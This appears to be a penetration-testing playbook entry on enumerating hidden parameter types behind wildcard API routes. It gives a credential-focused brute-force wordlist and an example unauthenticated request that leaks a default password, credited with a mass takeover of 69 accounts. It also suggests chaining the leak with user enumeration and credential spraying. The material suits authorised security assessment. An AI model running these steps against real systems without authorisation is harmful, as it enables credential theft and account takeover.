# Param Type Enumeration on Wildcard API Routes

## When to Use
- Phase 3 (Enumeration) or Phase 5 (Vuln Assessment)
- When a parameterized endpoint like `/api/get-params/{type}` is discovered
- When JS bundles reference only a subset of possible param values

## Technique
Many applications store configuration in a key-value params table with a wildcard API route. JS bundles reference the param types the frontend uses, but the backend often has MORE types including sensitive configuration.

## Procedure
1. Identify wildcard param endpoints from JS extraction (e.g., `/api/get-params/VERIFIKASI`)
2. Derive the pattern: `/api/get-params/{param_type}`
3. Brute-force param_type values using the wordlist below
4. For each 200 response with data, evaluate sensitivity

## Wordlist (Priority Order)
```
passDefault
password
defaultPassword
defaultPass
secret
apiKey
api_key
token
config
CONFIG
admin
ADMIN
EMAIL
SMS
OTP
SLA
CATEGORY
STATUS
DEPARTMENT
CHANNEL
VERIFIKASI
TEMPLATE
NOTIFICATION
WEBHOOK
DATABASE
CONNECTION
SERVER
HOST
PORT
QUEUE
REDIS
MAIL
SMTP
```

## Response Analysis
- `param_value` containing password-like strings → CRITICAL (credential exposure)
- `param_value` containing URLs/IPs → HIGH (internal infrastructure disclosure)
- `param_value` containing API keys/tokens → HIGH (third-party credential leak)
- `param_value` containing business config → MEDIUM (information disclosure)

## Example (BlueSpider, June 2026)
```
GET /api/get-params/passDefault (unauthenticated)
Response: [{"id":82,"param_type":"passDefault","param_value":"JAGO1234!","param_remarks":null}]
```
This single request exposed the system default password, enabling mass ATO of 69 production accounts.

## Integration with Other Findings
- Combine with user enumeration (`/api/load-user`) for email addresses
- Combine with login endpoint for credential spray
- Check if `reset-default-password` endpoint exists (confirms the mechanism)
